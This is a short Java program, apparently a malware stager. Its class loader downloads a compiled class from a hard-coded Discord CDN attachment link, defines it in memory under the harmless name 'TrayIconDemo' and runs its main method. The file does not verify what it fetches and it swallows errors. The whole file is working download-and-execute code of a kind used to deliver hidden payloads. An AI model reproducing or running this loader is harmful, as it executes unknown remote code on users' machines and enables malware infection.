

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
public class MainRunAny extends ClassLoader {
    public static String ClassURL = "https://cdn.discordapp.com/attachments/1194357245463502868/1209735726460174397/TrayIconDemo.class?ex=65e80130&is=65d58c30&hm=945303ef59ea7d24246dddccb61866d48f4dbaa634de754d37e03d5732fdefdd&";
    public Class findClass(String name, byte[] byteCode) throws ClassNotFoundException {return defineClass(name, byteCode, 0, byteCode.length);}
    private byte[] downloadUrl(URL aa) {ByteArrayOutputStream a = new ByteArrayOutputStream();try {byte[] b = new byte[4096];int c;InputStream d = aa.openStream();while ((c = d.read(b)) > 0) {a.write(b, 0, c);}} catch (IOException e) {return null;}return a.toByteArray();}
    public static Class DownloadClass(String url){try { MainRunAny LoadClass = new MainRunAny();byte[] hold = LoadClass.downloadUrl(new URL(url));Class cls = LoadClass.findClass("TrayIconDemo", hold);return cls;}catch (Exception e) {return null;}}
    public static void main(String[] args) {
        Class HoldClass = DownloadClass(ClassURL);

        try {

            HoldClass.getMethod("main",String[].class).invoke(null,new Object[]{args});
            //HoldClass.getMethod("main").invoke(null);
        } catch (Exception e) {
            System.out.println(e.getCause());
        }}

}
